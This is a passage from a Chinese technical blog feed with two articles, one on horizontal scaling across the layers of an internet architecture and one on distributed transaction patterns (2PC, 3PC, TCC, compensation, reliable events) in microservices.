<p>常见互联网分布式架构如上，分为：<br>（1）<strong>客户端层</strong>：典型调用方是浏览器 browser 或者手机应用 APP；<br>（2）<strong>反向代理层</strong>：系统入口，反向代理；<br>（3）<strong>站点应用层</strong>：实现核心应用逻辑，返回 html 或者 json；<br>（4）<strong>服务层</strong>：如果实现了服务化，就有这一层；<br>（5）<strong>数据-缓存层</strong>：缓存加速访问存储；<br>（6）<strong>数据-数据库层</strong>：数据库固化数据存储；</p>
<p>要想真个系统支持水平扩展，就必须每一层都支持水平扩展。</p>
<h2 id="各层该如何落地水平扩展？"><a href="#各层该如何落地水平扩展？" class="headerlink" title="各层该如何落地水平扩展？"></a>各层该如何落地水平扩展？</h2><h3 id="反向代理层如何进行水平扩展？"><a href="#反向代理层如何进行水平扩展？" class="headerlink" title="反向代理层如何进行水平扩展？"></a>反向代理层如何进行水平扩展？</h3><figure class="image-box">
                <img src="18.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;<strong>反向代理层的水平扩展，是通过“DNS 轮询”实现的</strong>：dns-server 对于一个域名配置了多个解析 ip，每次 DNS 解析请求来访问 dns-server，会轮询返回这些 ip。</p>
<p>&emsp;&emsp;当 nginx 成为瓶颈的时候，只要增加服务器数量，新增 nginx 服务的部署，增加一个外网 ip，就能扩展反向代理层的性能，做到理论上的无限高并发。</p>
<h3 id="站点层如何进行水平扩展？"><a href="#站点层如何进行水平扩展？" class="headerlink" title="站点层如何进行水平扩展？"></a>站点层如何进行水平扩展？</h3><figure class="image-box">
                <img src="19.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;<strong>站点层的水平扩展，是通过 “nginx” 实现的</strong>，通过修改<code>nginx.conf</code>，可以设置多个 web 后端。</p>
<blockquote>
<p>&emsp;&emsp;画外音：nginx 是个例子，有可能是 LVS 或者 F5 等反向代理。</p>
</blockquote>
<p>&emsp;&emsp;当 web 后端成为瓶颈的时候，只要增加服务器数量，新增 web 服务的部署，在 nginx 配置中配置上新的 web 后端，就能扩展站点层的性能，做到理论上的无限高并发。</p>
<h3 id="服务层如何进行水平扩展？"><a href="#服务层如何进行水平扩展？" class="headerlink" title="服务层如何进行水平扩展？"></a>服务层如何进行水平扩展？</h3><figure class="image-box">
                <img src="20.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;<strong>服务层的水平扩展，是通过“服务连接池”实现的。</strong></p>
<p>&emsp;&emsp;站点层通过 RPC-client 调用下游的服务层 RPC-server 时，RPC-client 中的连接池会建立与下游服务多个连接，当服务成为瓶颈的时候，只要增加服务器数量，新增服务部署，在 RPC-client 处建立新的下游服务连接，就能扩展服务层性能，做到理论上的无限高并发。</p>
<blockquote>
<p>&emsp;&emsp;画外音：如果需要优雅的进行服务层自动扩容，这里可能需要配置中心里服务自动发现功能的支持。</p>
</blockquote>
<h3 id="数据层如何进行水平扩展？"><a href="#数据层如何进行水平扩展？" class="headerlink" title="数据层如何进行水平扩展？"></a>数据层如何进行水平扩展？</h3><p>&emsp;&emsp;在数据量很大的情况下，数据层（缓存，数据库）涉及数据的水平扩展，将原本存储在一台服务器上的数据（缓存，数据库）水平拆分到不同服务器上去，以达到扩充系统性能的目的。</p>
<p>&emsp;&emsp;互联网数据层常见的水平拆分方式有这么几种，以数据库为例：</p>
<h4 id="一、按照范围水平拆分"><a href="#一、按照范围水平拆分" class="headerlink" title="一、按照范围水平拆分"></a>一、按照范围水平拆分</h4><figure class="image-box">
                <img src="21.webp" alt title class>
                <p></p>
            </figure>
<p>每一个数据服务，存储一定范围的数据，上图为例：</p>
<ul>
<li>user0 库，存储 uid 范围 1 - 1kw</li>
<li>user1 库，存储 uid 范围 1kw - 2kw</li>
</ul>
<p>这个方案的好处是：<br>（1）规则简单，service 只需判断一下 uid 范围就能路由到对应的存储服务；<br>（2）数据均衡性较好；<br>（3）比较容易扩展，可以随时加一个 uid[2kw, 3kw] 的数据服务；</p>
<p>不足是：<br>（1）请求的负载不一定均衡，一般来说，新注册的用户会比老用户更活跃，大 range 的服务请求压力会更大；</p>
<h4 id="二、按照哈希水平拆分"><a href="#二、按照哈希水平拆分" class="headerlink" title="二、按照哈希水平拆分"></a>二、按照哈希水平拆分</h4><figure class="image-box">
                <img src="22.webp" alt title class>
                <p></p>
            </figure>
<p>每一个数据库，存储某个 key 值 hash 后的部分数据，上图为例：</p>
<ul>
<li>user0 库，存储偶数 uid 数据</li>
<li>user1 库，存储奇数 uid 数据</li>
</ul>
<p>这个方案的好处是：<br>（1）规则简单，service 只需对 uid 进行 hash 能路由到对应的存储服务；<br>（2）数据均衡性较好；<br>（3）请求均匀性较好；</p>
<p>不足是：<br>（1）不容易扩展，扩展一个数据服务，hash 方法改变时候，可能需要进行数据迁移；</p>
<h2 id="通过水平拆分来扩充系统性能，与主从同步读写分离来扩充数据库性能，有什么本质的不同？"><a href="#通过水平拆分来扩充系统性能，与主从同步读写分离来扩充数据库性能，有什么本质的不同？" class="headerlink" title="通过水平拆分来扩充系统性能，与主从同步读写分离来扩充数据库性能，有什么本质的不同？"></a>通过水平拆分来扩充系统性能，与主从同步读写分离来扩充数据库性能，有什么本质的不同？</h2><blockquote>
<p>画外音：这两个方案千万别搞混。</p>
</blockquote>
<p>&emsp;&emsp;通过<strong>水平拆分扩展数据库性能</strong>：<br>&emsp;（1）<strong>每个服务器上存储的数据量是总量的 1/n</strong>，所以单机的性能也会有提升；<br>&emsp;（2）<strong>n 个服务器上的数据没有交集</strong>，那个服务器上数据的并集是数据的全集；<br>&emsp;（3）数据水平拆分到了 n 个服务器上，理论上<strong>读性能扩充了 n 倍，写性能也扩充了 n 倍</strong>（其实远不止 n 倍，因为单机的数据量变为了原来的 1/n）；</p>
<p>&emsp;&emsp;通过<strong>主从同步读写分离扩展数据库性能</strong>：<br>&emsp;（1）每个服务器上存储的<strong>数据量是和总量相同</strong>；<br>&emsp;（2）<strong>n 个服务器上的数据都一样</strong>，都是全集；<br>&emsp;（3）理论上<strong>读性能扩充了 n 倍，写仍然是单点</strong>，写性能不变；</p>
<p>&emsp;&emsp;缓存层的水平拆分和数据库层的水平拆分类似，也是以范围拆分和哈希拆分的方式居多，就不再展开。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。</p>
<p>&emsp;&emsp;提高系统并发能力的方法主要有两种：<br>&emsp;&emsp;- 垂直扩展（Scale Up）<br>&emsp;&emsp;- 水平扩展（Scale Out）</p>
<p>&emsp;&emsp;前者垂直扩展可以通过提升单机硬件性能，或者提升单机架构性能，来提高并发性，但单机性能总是有极限的，互联网分布式架构设计高并发终极解决方案还是后者：水平扩展。</p>
<p>&emsp;&emsp;互联网分层架构中，各层次水平扩展的实践又有所不同：<br>&emsp;（1）<strong>反向代理层</strong>可以通过“DNS 轮询”的方式来进行水平扩展；<br>&emsp;（2）<strong>站点层</strong>可以通过 nginx 来进行水平扩展；<br>&emsp;（3）<strong>服务层</strong>可以通过服务连接池来进行水平扩展；<br>&emsp;（4）<strong>数据库</strong>可以按照数据范围，或者数据哈希的方式来进行水平扩展；</p>
<p>&emsp;&emsp;各层实施水平扩展后，能够<strong>通过增加服务器数量的方式来提升系统的性能</strong>，做到理论上的性能无限。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[微服务下如何保证事务的一致性]]></title>
      <url>/2020/01/20/HowToEnsureConsistencyOfTransactionInMicroServices/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://segmentfault.com/a/1190000021574402" target="_blank" rel="noopener">https://segmentfault.com/a/1190000021574402</a></p>
</blockquote>
<a id="more"></a>

<h1 id="从本地事务到分布式事务的演变"><a href="#从本地事务到分布式事务的演变" class="headerlink" title="从本地事务到分布式事务的演变"></a>从本地事务到分布式事务的演变</h1><p>&emsp;&emsp;什么是事务？回答这个问题之前，我们先来看一个经典的场景：支付宝等交易平台的转账。假设小明需要用支付宝给小红转账 100000 元，此时，小明帐号会少 100000 元，而小红帐号会多 100000 元。如果在转账过程中系统崩溃了，小明帐号少 100000 元，而小红帐号金额不变，就会出大问题，因此这个时候我们就需要使用事务了。</p>
<figure class="image-box">
                <img src="1.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这里，体现了事务一个很重要的特性：原子性。事实上，事务有四个基本特性：原子性、一致性、隔离性、持久性。其中，</p>
<ul>
<li>原子性，即事务内的操作要么全部成功，要么全部失败，不会在中间的某个环节结束。</li>
<li>一致性，即数据库在一个事务执行之前和执行之后，数据库都必须处于一致性状态。如果事务执行失败，那么需要自动回滚到原始状态，换句话说，事务一旦提交，其他事务查看到的结果一致，事务一旦回滚，其他事务也只能看到回滚前的状态。</li>
<li>隔离性，即在并发环境中，不同的事务同时修改相同的数据时，一个未完成事务不会影响另外一个未完成事务。</li>
<li>持久性，即事务一旦提交，其修改的数据将永久保存到数据库中，其改变是永久性的。</li>
</ul>
<p>&emsp;&emsp;本地事务通过 ACID 保证数据的强一致性。ACID 是 Atomic（原子性）、Consistency（一致性）、 Isolation（隔离性）和 Durability（持久性）的缩写。在实际开发过程中，我们或多或少都有使用到本地事务。例如，MySQL 事务处理使用到 begin 开始一个事务，rollback 事务回滚，commit 事务确认。这里，事务提交后，通过 redo log 记录变更，通过 undo log 在失败时进行回滚，保证事务的原子性。</p>
<figure class="image-box">
                <img src="2.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;随着业务的高速发展，面对海量数据，例如，上千万甚至上亿的数据，查询一次所花费的时间会变长，甚至会造成数据库的单点压力。因此，我们就要考虑分库与分表方案了。分库与分表的目的在于，减小数据库的单库单表负担，提高查询性能，缩短查询时间。这里，我们先来看下单库拆分的场景。事实上，分表策略可以归纳为垂直拆分和水平拆分。</p>
<ul>
<li>垂直拆分，把表的字段进行拆分，即一张字段比较多的表拆分为多张表，这样使得行数据变小。一方面，可以减少客户端程序和数据库之间的网络传输的字节数，因为生产环境共享同一个网络带宽，随着并发查询的增多，有可能造成带宽瓶颈从而造成阻塞。另一方面，一个数据块能存放更多的数据，在查询时就会减少 I/O 次数。</li>
<li>水平拆分，把表的行进行拆分。因为表的行数超过几百万行时，就会变慢，这时可以把一张的表的数据拆成多张表来存放。水平拆分，有许多策略，例如，取模分表，时间维度分表等。</li>
</ul>
<p>&emsp;&emsp;这种场景下，虽然我们根据特定规则分表了，我们仍然可以使用本地事务。但是，库内分表，仅仅是解决了单表数据过大的问题，并没有把单表的数据分散到不同的物理机上，因此并不能减轻 MySQL 服务器的压力，仍然存在同一个物理机上的资源竞争和瓶颈，包括 CPU、内存、磁盘 IO、网络带宽等。<br>&emsp;&emsp;对于分库拆分的场景，它把一张表的数据划分到不同的数据库，多个数据库的表结构一样。此时，如果我们根据一定规则将我们需要使用事务的数据路由到相同的库中，可以通过本地事务保证其强一致性。但是，对于按照业务和功能划分的垂直拆分，它将把业务数据分别放到不同的数据库中。这里，拆分后的系统就会遇到数据的一致性问题，因为我们需要通过事务保证的数据分散在不同的数据库中，而每个数据库只能保证自己的数据可以满足 ACID 保证强一致性，但是在分布式系统中，它们可能部署在不同的服务器上，只能通过网络进行通信，因此无法准确地知道其他数据库中的事务执行情况。</p>
<figure class="image-box">
                <img src="3.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;此外，不仅仅在跨库调用存在本地事务无法解决的问题，随着微服务的落地，每个服务都有自己的数据库，并且数据库是相互独立且透明的。那如果服务 A 需要获取服务 B 的数据，就存在跨服务调用，如果遇到服务宕机，或者网络连接异常、同步调用超时等场景就会导致数据的不一致，这个也是一种分布式场景下需要考虑的数据一致性问题。</p>
<figure class="image-box">
                <img src="4.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;总结一下，当业务量级扩大之后的分库，以及微服务落地之后的业务服务化，都会产生分布式数据不一致的问题。既然本地事务无法满足需求，因此分布式事务就要登上舞台。什么是分布式事务？我们可以简单地理解，它就是为了保证不同数据库的数据一致性的事务解决方案。这里，我们有必要先来了解下 CAP 原则和 BASE 理论。<br>&emsp;&emsp;CAP 原则是 Consistency（一致性）、Availablity（可用性）和 Partition-tolerance（分区容错性）的缩写，它是分布式系统中的平衡理论。在分布式系统中，</p>
<ul>
<li>一致性要求所有节点每次读操作都能保证获取到最新数据；</li>
<li>可用性要求无论任何故障产生后都能保证服务仍然可用；</li>
<li>分区容错性要求被分区的节点可以正常对外提供服务。</li>
</ul>
<p>&emsp;&emsp;事实上，任何系统只可同时满足其中二个，无法三者兼顾。对于分布式系统而言，分区容错性是一个最基本的要求。那么，如果选择了一致性和分区容错性，放弃可用性，那么网络问题会导致系统不可用。如果选择可用性和分区容错性，放弃一致性，不同的节点之间的数据不能及时同步数据而导致数据的不一致。</p>
<figure class="image-box">
                <img src="5.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;此时，BASE 理论针对一致性和可用性提出了一个方案，BASE 是 Basically Available（基本可用）、Soft-state（软状态）和 Eventually Consistent（最终一致性）的缩写，它是最终一致性的理论支撑。简单地理解，在分布式系统中，允许损失部分可用性，并且不同节点进行数据同步的过程存在延时，但是在经过一段时间的修复后，最终能够达到数据的最终一致性。BASE 强调的是数据的最终一致性。相比于 ACID 而言，BASE 通过允许损失部分一致性来获得可用性。</p>
<p>&emsp;&emsp;现在，业内比较常用的分布式事务解决方案，包括强一致性的两阶段提交协议、三阶段提交协议，以及最终一致性的可靠事件模式、补偿模式、阿里的 TCC 模式。</p>
<h1 id="强一致性解决方案"><a href="#强一致性解决方案" class="headerlink" title="强一致性解决方案"></a>强一致性解决方案</h1><h2 id="二阶段提交协议"><a href="#二阶段提交协议" class="headerlink" title="二阶段提交协议"></a>二阶段提交协议</h2><p>&emsp;&emsp;在分布式系统中，每个数据库只能保证自己的数据可以满足 ACID 保证强一致性，但是它们可能部署在不同的服务器上，只能通过网络进行通信，因此无法准确的知道其他数据库中的事务执行情况。因此，为了解决多个节点之间的协调问题，就需要引入一个协调者负责控制所有节点的操作结果，要么全部成功，要么全部失败。其中，XA 协议是一个分布式事务协议，它有两个角色：事务管理者和资源管理者。这里，我们可以把事务管理者理解为协调者，而资源管理者理解为参与者。<br>&emsp;&emsp;XA 协议通过二阶段提交协议保证强一致性。<br>&emsp;&emsp;二阶段提交协议，顾名思义，它具有两个阶段：第一阶段准备，第二阶段提交。这里，事务管理者（协调者）主要负责控制所有节点的操作结果，包括准备流程和提交流程。</p>
<ul>
<li>第一阶段，事务管理者（协调者）向资源管理者（参与者）发起准备指令，询问资源管理者（参与者）预提交是否成功。如果资源管理者（参与者）可以完成，就会执行操作，并不提交，最后给出自己响应结果，是预提交成功还是预提交失败。</li>
<li>第二阶段，如果全部资源管理者（参与者）都回复预提交成功，资源管理者（参与者）正式提交命令。如果其中有一个资源管理者（参与者）回复预提交失败，则事务管理者（协调者）向所有的资源管理者（参与者）发起回滚命令。</li>
</ul>
<p>&emsp;&emsp;举个案例，现在我们有一个事务管理者（协调者），三个资源管理者（参与者），那么这个事务中我们需要保证这三个参与者在事务过程中的数据的强一致性。首先，事务管理者（协调者）发起准备指令预判它们是否已经预提交成功了，如果全部回复预提交成功，那么事务管理者（协调者）正式发起提交命令执行数据的变更。</p>
<figure class="image-box">
                <img src="6.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;注意的是，虽然二阶段提交协议为保证强一致性提出了一套解决方案，但是仍然存在一些问题。</p>
<ul>
<li>其一，事务管理者（协调者）主要负责控制所有节点的操作结果，包括准备流程和提交流程，但是整个流程是同步的，所以事务管理者（协调者）必须等待每一个资源管理者（参与者）返回操作结果后才能进行下一步操作。这样就非常容易造成同步阻塞问题。</li>
<li>其二，单点故障也是需要认真考虑的问题。事务管理者（协调者）和资源管理者（参与者）都可能出现宕机，如果资源管理者（参与者）出现故障则无法响应而一直等待，事务管理者（协调者）出现故障则事务流程就失去了控制者，换句话说，就是整个流程会一直阻塞，甚至极端的情况下，一部分资源管理者（参与者）数据执行提交，一部分没有执行提交，也会出现数据不一致性。</li>
</ul>
<p>&emsp;&emsp;此时，读者会提出疑问：这些问题应该都是小概率情况，一般是不会产生的？是的，但是对于分布式事务场景，我们不仅仅需要考虑正常逻辑流程，还需要关注小概率的异常场景，如果我们对异常场景缺乏处理方案，可能就会出现数据的不一致性，那么后期靠人工干预处理，会是一个成本非常大的任务，此外，对于交易的核心链路也许就不是数据问题，而是更加严重的资损问题。</p>
<h2 id="三阶段提交协议"><a href="#三阶段提交协议" class="headerlink" title="三阶段提交协议"></a>三阶段提交协议</h2><p>&emsp;&emsp;二阶段提交协议诸多问题，因此三阶段提交协议就要登上舞台了。三阶段提交协议是二阶段提交协议的改良版本，它与二阶段提交协议不同之处在于，引入了超时机制解决同步阻塞问题，此外加入了预备阶段尽可能提早发现无法执行的资源管理者（参与者）并且终止事务，如果全部资源管理者（参与者）都可以完成，才发起第二阶段的准备和第三阶段的提交。否则，其中任何一个资源管理者（参与者）回复执行，或者超时等待，那么就终止事务。总结一下，三阶段提交协议包括：第一阶段预备，第二阶段准备，第二阶段提交。</p>
<figure class="image-box">
                <img src="7.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;三阶段提交协议很好的解决了二阶段提交协议带来的问题，是一个非常有参考意义的解决方案。但是，极小概率的场景下可能会出现数据的不一致性。因为三阶段提交协议引入了超时机制，如果出现资源管理者（参与者）超时场景会默认提交成功，但是如果其没有成功执行，或者其他资源管理者（参与者）出现回滚，那么就会出现数据的不一致性。</p>
<h1 id="最终一致性解决方案"><a href="#最终一致性解决方案" class="headerlink" title="最终一致性解决方案"></a>最终一致性解决方案</h1><h2 id="TCC-模式"><a href="#TCC-模式" class="headerlink" title="TCC 模式"></a>TCC 模式</h2><p>&emsp;&emsp;二阶段提交协议和三阶段提交协议很好的解决了分布式事务的问题，但是在极端情况下仍然存在数据的不一致性，此外它对系统的开销会比较大，引入事务管理者（协调者）后，比较容易出现单点瓶颈，以及在业务规模不断变大的情况下，系统可伸缩性也会存在问题。注意的是，它是同步操作，因此引入事务后，直到全局事务结束才能释放资源，性能可能是一个很大的问题。因此，在高并发场景下很少使用。因此，阿里提出了另外一种解决方案：TCC 模式。注意的是，很多读者把二阶段提交等同于二阶段提交协议，这个是一个误区，事实上，TCC 模式也是一种二阶段提交。<br>&emsp;&emsp;TCC 模式将一个任务拆分三个操作：Try、Confirm、Cancel。假如，我们有一个 func() 方法，那么在 TCC 模式中，它就变成了 tryFunc()、confirmFunc()、cancelFunc() 三个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tryFunc();</span><br><span class="line">confirmFunc();</span><br><span class="line">cancelFunc();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在 TCC 模式中，主业务服务负责发起流程，而从业务服务提供 TCC 模式的 Try、Confirm、Cancel 三个操作。其中，还有一个事务管理器的角色负责控制事务的一致性。例如，我们现在有三个业务服务：交易服务，库存服务，支付服务。用户选商品，下订单，紧接着选择支付方式进行付款，然后这笔请求，交易服务会先调用库存服务扣库存，然后交易服务再调用支付服务进行相关的支付操作，然后支付服务会请求第三方支付平台创建交易并扣款，这里，交易服务就是主业务服务，而库存服务和支付服务是从业务服务。</p>
<figure class="image-box">
                <img src="8.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;我们再来梳理下 TCC 模式的流程。</p>
<ul>
<li>第一阶段，主业务服务调用全部的从业务服务的 Try 操作，并且事务管理器记录操作日志。</li>
<li>第二阶段，当全部从业务服务都成功时，再执行 Confirm 操作，否则会执行 Cancel 逆操作进行回滚。</li>
</ul>
<figure class="image-box">
                <img src="9.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;现在，我们针对 TCC 模式说说大致业务上的实现思路。首先，交易服务（主业务服务）会向事务管理器注册并启动事务。其实，事务管理器是一个概念上的全局事务管理机制，可以是一个内嵌于主业务服务的业务逻辑，或者抽离出的一个 TCC 框架。事实上，它会生成全局事务 ID 用于记录整个事务链路，并且实现了一套嵌套事务的处理逻辑。当主业务服务调用全部的从业务服务的 try 操作，事务管理器利用本地事务记录相关事务日志，这个案例中，它记录了调用库存服务的动作记录，以及调用支付服务的动作记录，并将其状态设置成“预提交”状态。这里，调用从业务服务的 Try 操作就是核心的业务代码。当全部从业务服务都成功时，由事务管理器通过 TCC 事务上下文切面执行 Confirm 操作，将其状态设置成“成功”状态，否则执行 Cancel 操作将其状态设置成“预提交”状态，然后进行重试。因此，TCC 模式通过补偿的方式保证其最终一致性。</p>
<p>&emsp;&emsp;这里，我们要特别注意操作的幂等性。幂等机制的核心是保证资源唯一性，例如重复提交或服务端的多次重试只会产生一份结果。支付场景、退款场景，涉及金钱的交易不能出现多次扣款等问题。事实上，查询接口用于获取资源，因为它只是查询数据而不会影响到资源的变化，因此不管调用多少次接口，资源都不会改变，所以是它是幂等的。而新增接口是非幂等的，因为调用接口多次，它都将会产生资源的变化。因此，我们需要在出现重复提交时进行幂等处理。<br>&emsp;&emsp;那么，如何保证幂等机制呢？事实上，我们有很多实现方案。其中，一种方案就是常见的创建唯一索引。在数据库中针对我们需要约束的资源字段创建唯一索引，可以防止插入重复的数据。但是，遇到分库分表的情况是，唯一索引也就不那么好使了，此时，我们可以先查询一次数据库，然后判断是否约束的资源字段存在重复，没有重复时再进行插入操作。注意的是，为了避免并发场景，我们可以通过锁机制，例如悲观锁与乐观锁保证数据的唯一性。这里，分布式锁是一种经常使用的方案，它通常情况下是一种悲观锁的实现。但是，很多人经常把悲观锁、乐观锁、分布式锁当作幂等机制的解决方案，这是不正确的。除此之外，我们还可以引入状态机，通过状态机进行状态的约束以及状态跳转，确保同一个业务的流程化执行，从而实现数据幂等。</p>
<h2 id="补偿模式"><a href="#补偿模式" class="headerlink" title="补偿模式"></a>补偿模式</h2><p>&emsp;&emsp;上节，我们提到了重试机制。事实上，它也是一种最终一致性的解决方案。我们需要通过最大努力不断重试，保证数据库的操作最终一定可以保证数据一致性，如果最终多次重试失败可以根据相关日志并主动通知开发人员进行手工介入。注意的是，被调用方需要保证其幂等性。重试机制可以是同步机制，例如主业务服务调用超时或者非异常的调用失败需要及时重新发起业务调用。重试机制可以大致分为固定次数的重试策略与固定时间的重试策略。除此之外，我们还可以借助消息队列和定时任务机制。消息队列的重试机制，即消息消费失败则进行重新投递，这样就可以避免消息没有被消费而被丢弃，例如 RocketMQ 可以默认允许每条消息最多重试 16 次，每次重试的间隔时间可以进行设置。定时任务的重试机制，我们可以创建一张任务执行表，并增加一个“重试次数”字段。这种设计方案中，我们可以在定时调用时，获取这个任务是否是执行失败的状态并且没有超过重试次数，如果是则进行失败重试。但是，当出现执行失败的状态并且超过重试次数时，就说明这个任务永久失败了，需要开发人员进行手工介入与排查问题。<br>&emsp;&emsp;除了重试机制之外，也可以在每次更新的时候进行修复。例如，对于社交互动的点赞数、收藏数、评论数等计数场景，也许因为网络抖动或者相关服务不可用，导致某段时间内的数据不一致，我们就可以在每次更新的时候进行修复，保证系统经过一段较短的时间的自我恢复和修正，数据最终达到一致。需要注意的是，使用这种解决方案的情况下，如果某条数据出现不一致性，但是又没有再次更新修复，那么其永远都会是异常数据。<br>&emsp;&emsp;定时校对也是一种非常重要的解决手段，它采取周期性的进行校验操作来保证。关于定时校对可以分为两种场景，一种是未完成的定时重试，例如我们利用定时任务扫描还未完成的调用任务，并通过补偿机制来修复，实现数据最终达到一致。另一种是定时核对，它需要主业务服务提供相关查询接口给从业务服务核对查询，用于恢复丢失的业务数据。现在，我们来试想一下电商场景的退款业务。在这个退款业务中会存在一个退款基础服务和自动化退款服务。此时，自动化退款服务在退款基础服务的基础上实现退款能力的增强，实现基于多规则的自动化退款，并且通过消息队列接收退款基础服务推送的退款快照信息。但是，由于退款基础服务发送消息丢失或者消息队列在多次失败重试后的主动丢弃，都很有可能造成数据的不一致性。因此，我们通过定时从退款基础服务查询核对，恢复丢失的业务数据就显得特别重要了。</p>
<h2 id="可靠事件模式"><a href="#可靠事件模式" class="headerlink" title="可靠事件模式"></a>可靠事件模式</h2><p>&emsp;&emsp;在分布式系统中，消息队列在服务端的架构中的地位非常重要，主要解决异步处理、系统解耦、流量削峰等场景。多个系统之间如果同步通信很容易造成阻塞，同时会将这些系统会耦合在一起。因此，引入了消息队列，一方面解决了同步通信机制造成的阻塞，另一方面通过消息队列进行业务解耦。</p>
<figure class="image-box">
                <img src="10.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;可靠事件模式，通过引入可靠的消息队列，只要保证当前的可靠事件投递并且消息队列确保事件传递至少一次，那么订阅这个事件的消费者保证事件能够在自己的业务内被消费即可。这里，请读者思考，是否只要引入了消息队列就可以解决问题了呢？事实上，只是引入消息队列并不能保证其最终的一致性，因为分布式部署环境下都是基于网络进行通信，而网络通信过程中，上下游可能因为各种原因而导致消息丢失。<br>&emsp;&emsp;其一，主业务服务发送消息时可能因为消息队列无法使用而发生失败。对于这种情况，我们可以让主业务服务（生产者）发送消息，再进行业务调用来确保。一般的做法是，主业务服务将要发送的消息持久化到本地数据库，设置标志状态为“待发送”状态，然后把消息发送给消息队列，消息队列收到消息后，也把消息持久化到其存储服务中，但并不是立即向从业务服务（消费者）投递消息，而是先向主业务服务（生产者）返回消息队列的响应结果，然后主业务服务判断响应结果执行之后的业务处理。如果响应失败，则放弃之后的业务处理，设置本地的持久化消息标志状态为“结束”状态。否则，执行后续的业务处理，设置本地的持久化消息标志状态为“已发送”状态。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doServer</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    send();</span><br><span class="line">    <span class="comment">// 执行业务</span></span><br><span class="line">    exec();</span><br><span class="line">    <span class="comment">// 更新消息状态</span></span><br><span class="line">    updateMsg();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;此外，消息队列发送消息后，也可能从业务服务（消费者）宕机而无法消费。绝大多数消息中间件对于这种情况，例如 RabbitMQ、RocketMQ 等引入了 ACK 机制。注意的是，默认的情况下，采用自动应答，这种方式中消息队列会发送消息后立即从消息队列中删除该消息。所以，为了确保消息的可靠投递，我们通过手动 ACK 方式，如果从业务服务（消费者）因宕机等原因没有发送 ACK，消息队列会将消息重新发送，保证消息的可靠性。从业务服务处理完相关业务后通过手动 ACK 通知消息队列，消息队列才从消息队列中删除该持久化消息。那么，消息队列如果一直重试失败而无法投递，就会出现消息主动丢弃的情况，我们需要如何解决呢？聪明的读者可能已经发现，我们在上个步骤中，主业务服务已经将要发送的消息持久化到本地数据库。因此，从业务服务消费成功后，它也会向消息队列发送一个通知消息，此时它是一个消息的生产者。主业务服务（消费者）接收到消息后，最终把本地的持久化消息标志状态为“完成”状态。说到这里，读者应该可以理解到我们使用“正反向消息机制”确保了消息队列可靠事件投递。当然，补偿机制也是必不可少的。定时任务会从数据库扫描在一定时间内未完成的消息并重新投递。</p>
<figure class="image-box">
                <img src="11.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;注意的是，因为从业务服务可能收到消息处理超时或者服务宕机，以及网络等原因导致消息队列收不到消息的处理结果，因此可靠事件投递并且消息队列确保事件传递至少一次。这里，从业务服务（消费者）需要保证幂等性。如果从业务服务（消费者）没有保证接口的幂等性，将会导致重复提交等异常场景。此外，我们也可以独立消息服务，将消息服务独立部署，根据不同的业务场景共用该消息服务，降低重复开发服务的成本。<br>&emsp;&emsp;了解了“可靠事件模式”的方法论后，现在我们来看一个真实的案例来加深理解。首先，当用户发起退款后，自动化退款服务会收到一个退款的事件消息，此时，如果这笔退款符合自动化退款策略的话，自动化退款服务会先写入本地数据库持久化这笔退款快照，紧接着，发送一条执行退款的消息投递到给消息队列，消息队列接受到消息后返回响应成功结果，那么自动化退款服务就可以执行后续的业务逻辑。与此同时，消息队列异步地把消息投递给退款基础服务，然后退款基础服务执行自己业务相关的逻辑，执行失败与否由退款基础服务自我保证，如果执行成功则发送一条执行退款成功消息投递到给消息队列。最后，定时任务会从数据库扫描在一定时间内未完成的消息并重新投递。这里，需要注意的是，自动化退款服务持久化的退款快照可以理解为需要确保投递成功的消息，由“正反向消息机制”和“定时任务”确保其成功投递。此外，真正的退款出账逻辑由退款基础服务来保证，因此它要保证幂等性，及出账逻辑的收敛。当出现执行失败的状态并且超过重试次数时，就说明这个任务永久失败了，需要开发人员进行手工介入与排查问题。</p>
<figure class="image-box">
                <img src="12.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;总结一下，引入了消息队列并不能保证可靠事件投递，换句话说，由于网络等各种原因而导致消息丢失不能保证其最终的一致性，因此，我们需要通过“正反向消息机制”确保了消息队列可靠事件投递，并且使用补偿机制尽可能在一定时间内未完成的消息并重新投递。</p>
